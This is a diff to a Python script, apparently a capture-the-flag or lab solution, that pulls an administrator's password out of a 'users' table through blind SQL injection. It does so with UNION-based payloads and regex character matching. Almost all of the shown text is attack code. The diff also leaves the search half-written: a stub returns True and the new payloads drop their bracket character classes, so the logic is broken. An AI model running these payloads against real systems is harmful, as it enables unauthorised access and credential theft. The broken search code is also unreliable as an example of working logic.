@@ -76,26 +76,28 @@ def linear_search():
     return prefix
 
 def recursive_binary_search(substring, middle_seperator_of_valid_character_set, administrator_password):
-    if try_query(f"x' union select 'a' from users where username = 'administrator' and password ~ '^[{substring[:middle_seperator_of_valid_character_set]}]'--") and (len(substring) == 1):
-        print(f"Match found: {substring[:middle_seperator_of_valid_character_set]}")
-        administrator_password += substring[:middle_seperator_of_valid_character_set]
-        print(f"Updated Password is: {administrator_password}")
-        return administrator_password
-    elif try_query(f"x' union select 'a' from users where username = 'administrator' and password ~ '^[{substring[middle_seperator_of_valid_character_set:]}]'--") and (len(substring) == 1):
-        print(f"Match found: {substring[middle_seperator_of_valid_character_set:]}")
-        administrator_password += substring[middle_seperator_of_valid_character_set:]
-        print(f"Updated Password is: {administrator_password}")
-        return administrator_password
-    elif try_query
+    print(f"Substring: {substring}")
+    print(f"Middle Seperator: {middle_seperator_of_valid_character_set}")
+    print(f"administrator_password: {administrator_password}")
+    return True
+    
 
 
 def binary_search(url):
     valid_character_set = string.ascii_lowercase + string.digits
+    print(valid_character_set)
     administrator_password = ''
     incomplete_password = True  # Flag, to keep the program going until a whole password is found, which is set by finding a exact match
-    while incomplete_password:
-        middle_seperator_of_valid_character_set = len(valid_character_set) // 2
+    middle_seperator_of_valid_character_set = len(valid_character_set) // 2
 
+    query_left = f"x' union select 'a' from users where username = 'administrator' and password ~ '^{valid_character_set[:middle_seperator_of_valid_character_set]}'--"
+    query_right = f"x' union select 'a' from users where username = 'administrator' and password ~ '^{valid_character_set[middle_seperator_of_valid_character_set:]}'--"
+    if try_query(query_left):
+        administrator_password = recursive_binary_search(valid_character_set[:middle_seperator_of_valid_character_set], len(valid_character_set[:middle_seperator_of_valid_character_set]), administrator_password)
+    elif try_query(query_right):
+        administrator_password = recursive_binary_search(valid_character_set[middle_seperator_of_valid_character_set:], len(valid_character_set[:middle_seperator_of_valid_character_set:]), administrator_password)
+    else:
+        print("Error occured, no substring is correct")
 
 # To clean things up
 if __name__ == "__main__":
@@ -106,11 +108,11 @@ if __name__ == "__main__":
     url = f'https://{site}/'
 
     # Step #6: Password Length:
-    password_length = find_password_length()
+    # password_length = find_password_length()
 
     # Step #8: Linear Password search:
-    reference_password = linear_search()
-    print(f"Password reference password is {reference_password}")
+    # reference_password = linear_search()
+    # print(f"Password reference password is {reference_password}")
 
     # Step #11: Binary Search:
     binary_search(url)
